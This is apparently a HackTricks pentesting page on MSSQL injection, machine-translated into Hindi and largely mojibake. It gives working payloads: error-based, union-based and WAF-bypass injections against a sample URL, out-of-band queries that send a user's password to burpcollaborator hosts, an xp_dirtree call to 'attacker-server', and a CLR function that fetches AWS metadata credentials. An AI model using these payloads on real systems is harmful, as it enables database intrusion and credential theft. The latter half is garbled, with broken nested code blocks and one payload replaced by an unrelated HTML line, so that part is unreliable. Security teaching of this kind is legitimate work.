# MSSQL Injection

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)** рдХреЛ** **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

## Active Directory enumeration

рдПрдХ MSSQL рд╕рд░реНрд╡рд░ рдХреЗ рдЕрдВрджрд░ SQL рдЗрдиреНрдЬреЗрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рдбреЛрдореЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЬрд╛рдВрдЪрдирд╛ рд╕рдВрднрд╡** рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд MSSQL рдлрдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ:

* **`SELECT DEFAULT_DOMAIN()`**: рд╡рд░реНрддрдорд╛рди рдбреЛрдореЗрди рдирд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред
* **`master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))`**: рдпрджрд┐ рдЖрдк рдбреЛрдореЗрди рдХрд╛ рдирд╛рдо рдЬрд╛рдирддреЗ рд╣реИрдВ (_рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП DOMAIN_) рддреЛ рдпрд╣ рдлрд╝рдВрдХреНрд╢рди **рдкреНрд░рд╢рд╛рд╕рдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ Administrator** рдХрд╛ **SID** рд╣реЗрдХреНрд╕ рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рд▓реМрдЯрд╛рдПрдЧрд╛ред рдпрд╣ `0x01050000000[...]0000f401` рдЬреИрд╕рд╛ рджрд┐рдЦреЗрдЧрд╛, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдЕрдВрддрд┐рдо 4 рдмрд╛рдЗрдЯ** рдирдВрдмрд░ **500** рд╣реИрдВ рдЬреЛ **рдмрдбрд╝реЗ рдЗрдВрдбрд┐рдпрди** рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рд╣реИ, рдЬреЛ **рдкреНрд░рд╢рд╛рд╕рдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рд╕рд╛рдорд╛рдиреНрдп рдЖрдИрдбреА рд╣реИ**ред\
рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдЖрдкрдХреЛ **рдбреЛрдореЗрди рдХреА рдЖрдИрдбреА рдкрддрд╛ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛** (рдЕрдВрддрд┐рдо 4 рдмрд╛рдЗрдЯ рдХреЛ рдЫреЛрдбрд╝рдХрд░ рд╕рднреА рдмрд╛рдЗрдЯреНрд╕)ред
* **`SUSER_SNAME(0x01050000000[...]0000e803)`** : рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЖрдИрдбреА рдХрд╛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рд▓реМрдЯрд╛рдПрдЧрд╛** (рдпрджрд┐ рдХреЛрдИ рд╣реЛ), рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ **0000e803** рдмрдбрд╝реЗ рдЗрдВрдбрд┐рдпрди рдореЗрдВ == **1000** (рдЖрдо рддреМрд░ рдкрд░ рдпрд╣ рдкрд╣рд▓реЗ рдирд┐рдпрдорд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрдИрдбреА рдХрд╛ рдЖрдИрдбреА рд╣реИ)ред рдлрд┐рд░ рдЖрдк рд╕реЛрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЖрдк 1000 рд╕реЗ 2000 рддрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЖрдИрдбреА рдХреЛ рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдбреЛрдореЗрди рдХреЗ рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ:
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **рд╡реИрдХрд▓реНрдкрд┐рдХ рддреНрд░реБрдЯрд┐-рдЖрдзрд╛рд░рд┐рдд рд╡реЗрдХреНрдЯрд░реНрд╕**

рддреНрд░реБрдЯрд┐-рдЖрдзрд╛рд░рд┐рдд SQL рдЗрдиреНрдЬреЗрдХреНрд╢рди рдЖрдо рддреМрд░ рдкрд░ `+AND+1=@@version--` рдЬреИрд╕реЗ рдирд┐рд░реНрдорд╛рдгреЛрдВ рдХреА рддрд░рд╣ рд╣реЛрддреА рд╣реИрдВ рдФрд░ рд╡реЗрд░рд┐рдПрдВрдЯреНрд╕ рдЬреЛ "OR" рдСрдкрд░реЗрдЯрд░ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реИрдВред рдЗрд╕ рддрд░рд╣ рдХреЗ рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐рдпреЛрдВ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХреНрд╡реЗрд░реА рдЖрдо рддреМрд░ рдкрд░ WAFs рджреНрд╡рд╛рд░рд╛ рдЕрд╡рд░реЛрдзрд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рдПрдХ рдмрд╛рдпрдкрд╛рд╕ рдХреЗ рд░реВрдк рдореЗрдВ, рдЦреЛрдЬреА рдЧрдИ рдбреЗрдЯрд╛ рдкрд░ рдбреЗрдЯрд╛ рдкреНрд░рдХрд╛рд░ рдкрд░рд┐рд╡рд░реНрддрди рддреНрд░реБрдЯрд┐ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдлрд╝рдВрдХреНрд╢рди рдХреЙрд▓ рдХреЗ рдкрд░рд┐рдгрд╛рдо рдХреЗ рд╕рд╛рде %2b рд╡рд░реНрдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред

рдЗрди рддрд░рд╣ рдХреЗ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдХреБрдЫ рдЙрджрд╛рд╣рд░рдг:

* `SUSER_NAME()`
* `USER_NAME()`
* `PERMISSIONS()`
* `DB_NAME()`
* `FILE_NAME()`
* `TYPE_NAME()`
* `COL_NAME()`

рдлрд╝рдВрдХреНрд╢рди `USER_NAME()` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд╛ рдЙрджрд╛рд╣рд░рдг:
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png)

## SSRF

рдпреЗ SSRF рдЯреНрд░рд┐рдХреНрд╕ [рдпрд╣рд╛рдБ рд╕реЗ рд▓реА рдЧрдИ рдереАрдВ](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

### `fn_xe_file_target_read_file`

рдЗрд╕реЗ рд╕рд░реНрд╡рд░ рдкрд░ **`VIEW SERVER STATE`** рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`

рдЗрд╕реЗ **`CONTROL SERVER`** рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettabe`

рдЗрд╕реЗ **`CONTROL SERVER`** рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

рдЬреИрд╕реЗ рдХрд┐ рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рджреНрд╡рд╛рд░рд╛ рдЖрдзрд┐рдХрд╛рд░рд┐рдХ рд░реВрдк рд╕реЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реАрдХреГрдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, `xp_dirtree` рдЬреИрд╕реА рд╕реНрдЯреЛрд░реНрдб рдкреНрд░реЛрд╕реАрдЬрд░реНрд╕ рдХреЛ рдЕрдиреНрдп рд▓реЛрдЧреЛрдВ рдиреЗ рдСрдирд▓рд╛рдЗрди рд╡рд░реНрдгрд┐рдд рдХрд┐рдпрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпреЗ MSSQL рдХреЗ рднреАрддрд░ рдиреЗрдЯрд╡рд░реНрдХ рдСрдкрд░реЗрд╢рди рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реИрдВред рдЗрди рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЖрдЙрдЯ рдСрдл рдмреИрдВрдб рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд╕реА рдореЗрдВ рдЕрдХреНрд╕рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреИрд╕рд╛ рдХрд┐ рд╡рд┐рднрд┐рдиреНрди [рдЙрджрд╛рд╣рд░рдгреЛрдВ](https://www.notsosecure.com/oob-exploitation-cheatsheet/) рдФрд░ [рдкреЛрд╕реНрдЯреЛрдВ](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/) рдореЗрдВ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `xp_dirtree` рд╕реНрдЯреЛрд░реНрдб рдкреНрд░реЛрд╕реАрдЬрд░, рдиреЗрдЯрд╡рд░реНрдХ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдХреЗрд╡рд▓ TCP рдкреЛрд░реНрдЯ 445 рдкрд░ рд╕реАрдорд┐рдд рд╣реИред рдкреЛрд░реНрдЯ рдирдВрдмрд░ рд╕рдВрд╢реЛрдзрд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рдиреЗрдЯрд╡рд░реНрдХ рд╢реЗрдпрд░ рд╕реЗ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЙрдкрдпреЛрдЧ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд SQL рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\' + @user + '.attacker-server\\aa"');
```
рдпрд╣ рдЙрд▓реНрд▓реЗрдЦрдиреАрдп рд╣реИ рдХрд┐ рдпрд╣ рд╡рд┐рдзрд┐ рд╕рднреА рд╕рд┐рд╕реНрдЯрдо рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкрд░ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд╕рдХрддреА, рдЬреИрд╕реЗ рдХрд┐ `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)` рдЬреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЗ рд╕рд╛рде `Windows Server 2016 Datacenter` рдкрд░ рдЪрд▓ рд░рд╣рд╛ рд╣реИред

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, `master..xp_fileexist` рдФрд░ `xp_subdirs` рдЬреИрд╕реЗ рд╡реИрдХрд▓реНрдкрд┐рдХ рд╕реНрдЯреЛрд░реНрдб рдкреНрд░реЛрд╕реАрдЬрд░ рд╣реИрдВ рдЬреЛ рд╕рдорд╛рди рдкрд░рд┐рдгрд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред `xp_fileexist` рдкрд░ рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг [TechNet article](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx) рдореЗрдВ рдЙрдкрд▓рдмреНрдз рд╣реИред


### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рдЖрдк **`xp_cmdshell`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреБрдЫ рдРрд╕рд╛ **рдПрдХреНрд╕реАрдХреНрдпреВрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ **SSRF** рдХреЛ **рдЯреНрд░рд┐рдЧрд░** рдХрд░рддрд╛ рд╣реИред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рдкреГрд╖реНрда рдореЗрдВ **рд╕рдВрдмрдВрдзрд┐рдд рдЦрдВрдб** рдкрдврд╝реЗрдВ:

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

### MSSQL рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд╛рд░реНрдп - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

CLR UDF (Common Language Runtime User Defined Function) рдмрдирд╛рдирд╛, рдЬреЛ рдХрд┐рд╕реА рднреА .NET рднрд╛рд╖рд╛ рдореЗрдВ рд▓рд┐рдЦрд╛ рдЧрдпрд╛ рдХреЛрдб рд╣реИ рдФрд░ рдПрдХ DLL рдореЗрдВ рдХрдВрдкрд╛рдЗрд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддрд╛рдХрд┐ рдЗрд╕реЗ MSSQL рдореЗрдВ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрдорд┐рдд рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `dbo` рдПрдХреНрд╕реЗрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдпрд╣ рд╕рд╛рдорд╛рдиреНрдпрдд: рддрдм рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдбреЗрдЯрд╛рдмреЗрд╕ рдХрдиреЗрдХреНрд╢рди `sa` рдХреЗ рд░реВрдк рдореЗрдВ рдпрд╛ рдПрдбрдорд┐рдирд┐рд╕реНрдЯреНрд░реЗрдЯрд░ рднреВрдорд┐рдХрд╛ рдХреЗ рд╕рд╛рде рдХреА рдЬрд╛рддреА рд╣реИред

рдПрдХ рд╡рд┐рдЬреБрдЕрд▓ рд╕реНрдЯреВрдбрд┐рдпреЛ рдкрд░рд┐рдпреЛрдЬрдирд╛ рдФрд░ рд╕реНрдерд╛рдкрдирд╛ рдирд┐рд░реНрджреЗрд╢ рдЗрд╕ [рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА](https://github.com/infiniteloopltd/SQLHttp) рдореЗрдВ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рд╣реИрдВ рддрд╛рдХрд┐ MSSQL рдореЗрдВ рдмрд╛рдЗрдирд░реА рдХреЛ CLR рдПрд╕реЗрдореНрдмрд▓реА рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рдЬрд┐рд╕рд╕реЗ MSSQL рдореЗрдВ рд╕реЗ HTTP GET рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛред

рдЗрд╕ рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХрд╛ рдореВрд▓ рднрд╛рдЧ `http.cs` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реИ, рдЬреЛ `WebClient` рд╡рд░реНрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдПрдХ GET рдЕрдиреБрд░реЛрдз рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдФрд░ рд╕рд╛рдордЧреНрд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬреИрд╕рд╛ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString(html);
}
}
```
рдкрд╣рд▓реЗ `CREATE ASSEMBLY` SQL рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд SQL рд╕реНрдирд┐рдкреЗрдЯ рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреА рд╕рд▓рд╛рд╣ рджреА рдЬрд╛рддреА рд╣реИ рддрд╛рдХрд┐ рдЕрд╕реЗрдореНрдмрд▓реА рдХреЗ SHA512 рд╣реИрд╢ рдХреЛ рд╕рд░реНрд╡рд░ рдХреА рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдЕрд╕реЗрдореНрдмрд▓рд┐рдпреЛрдВ рдХреА рд╕реВрдЪреА рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХреЗ (рдЬрд┐рд╕реЗ `select * from sys.trusted_assemblies;` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ):
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
рдЬрдм рдПрд╕реЗрдореНрдмрд▓реА рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдЬреЛрдбрд╝ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдлрд╝рдВрдХреНрд╢рди рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд SQL рдХреЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ HTTP рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
### **рддреНрд╡рд░рд┐рдд рд╢реЛрдз: рдПрдХ рд╣реА рдХреНрд╡реЗрд░реА рдореЗрдВ рдкреВрд░реА рддрд╛рд▓рд┐рдХрд╛ рд╕рд╛рдордЧреНрд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛**

[рдпрд╣рд╛рдБ рд╕реЗ рдЯреНрд░рд┐рдХ](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

рдПрдХ рд╕рдВрдХреНрд╖рд┐рдкреНрдд рд╡рд┐рдзрд┐ рдЬрд┐рд╕рд╕реЗ рдПрдХ рд╣реА рдХреНрд╡реЗрд░реА рдореЗрдВ рдХрд┐рд╕реА рддрд╛рд▓рд┐рдХрд╛ рдХреА рдкреВрд░реА рд╕рд╛рдордЧреНрд░реА рдирд┐рдХрд╛рд▓реА рдЬрд╛ рд╕рдХрддреА рд╣реИ, рдЙрд╕рдореЗрдВ `FOR JSON` рд╢рд░реНрдд рдХрд╛ рдЙрдкрдпреЛрдЧ рд╢рд╛рдорд┐рд▓ рд╣реИред рдпрд╣ рджреГрд╖реНрдЯрд┐рдХреЛрдг `FOR XML` рд╢рд░реНрдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╕реЗ рдЕрдзрд┐рдХ рд╕рдВрдХреНрд╖реЗрдкрд┐рдд рд╣реИ, рдЬрд┐рд╕рдореЗрдВ "raw" рдЬреИрд╕рд╛ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдореЛрдб рдЖрд╡рд╢реНрдпрдХ рд╣реЛрддрд╛ рд╣реИред `FOR JSON` рд╢рд░реНрдд рдХреЛ рдЙрд╕рдХреА рд╕рдВрдХреНрд╖рд┐рдкреНрддрддрд╛ рдХреЗ рд▓рд┐рдП рдкрд╕рдВрдж рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдпрд╣рд╛рдБ рд╡рд░реНрддрдорд╛рди рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рд╕реНрдХреАрдорд╛, рддрд╛рд▓рд┐рдХрд╛рдПрдВ, рдФрд░ рд╕реНрддрдВрдн рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рд╣реИ:
```sql
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
In situations where error-based vectors are used, it's crucial to provide an alias or a name. This is because the output of expressions, if not provided with either, cannot be formatted as JSON. Here's an example of how this is done:

```sql
### MSSQL Injection

#### Union-Based MSSQL Injection

To perform Union-Based MSSQL Injection, follow these steps:

1. Identify the vulnerable parameter in the URL, e.g., `id=1`.
2. Use the payload `1' and 1=(select concat_ws(0x3a,table_schema,table_name,column_name)a from information_schema.columns for json auto)--` in the parameter.
```

### Retrieving the Current Query

[Trick from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

For users granted the `VIEW SERVER STATE` permission on the server, it's possible to see all executing sessions on the SQL Server instance. However, without this permission, users can only view their current session. The currently executing SQL query can be retrieved by accessing sys.dm_exec_requests and sys.dm_exec_sql_text:

```sql
```html
рдпрд╣рд╛рдБ рдПрдХ SQL Injection рд╣рдорд▓рд╛ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ: https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```
```

To check if you have the VIEW SERVER STATE permission, the following query can be used:

```sql
```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```
```

## **Little tricks for WAF bypasses**

[Tricks also from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

Non-standard whitespace characters: %C2%85 ╨╕╨╗╨╕ %C2%A0:

```
```html
<p>рдпрд╣рд╛рдБ рдПрдХ SQL Injection рд╣реИ рдЬреЛ MSSQL рдбреЗрдЯрд╛рдмреЗрд╕ рдкрд░ рдХрд╛рдо рдХрд░рддреА рд╣реИред</p>
```
```

Scientific (0e) and hex (0x) notation for obfuscating UNION:

```
```html
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--

https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```
```

A period instead of a whitespace between FROM and a column name:

```
### MSSQL Injection

#### Union-Based SQL Injection

To perform a union-based SQL injection attack on a MSSQL database, you can use the following URL format:

```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```

